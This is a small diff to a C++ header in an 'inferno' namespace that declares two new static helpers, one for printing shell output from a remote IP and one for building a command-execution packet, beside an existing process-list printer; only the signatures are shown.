@@ -39,6 +39,8 @@ private:
     bool                       m_running;
 
     static void printProcessList(const std::string& ip, const std::string& payload);
+    static void printShellOutput(const std::string& ip, const std::string& payload);
+    static std::string buildCmdExecPacket(const std::string& command);
 };
 
 } // namespace inferno
